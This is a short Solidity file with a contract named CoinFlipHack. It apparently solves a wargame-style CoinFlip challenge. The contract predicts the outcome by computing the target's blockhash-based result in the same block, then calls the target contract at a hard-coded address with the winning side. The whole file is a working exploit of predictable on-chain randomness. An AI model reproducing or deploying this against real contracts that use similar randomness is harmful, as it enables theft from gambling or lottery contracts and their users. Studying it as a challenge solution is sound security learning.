// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./contract.sol";

contract CoinFlipHack {
    CoinFlip public originalContract =
        CoinFlip(0xC52b48df6C15c0Eae870341DC45bA611A76E49c2);

    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        originalContract.flip(side);
    }
}
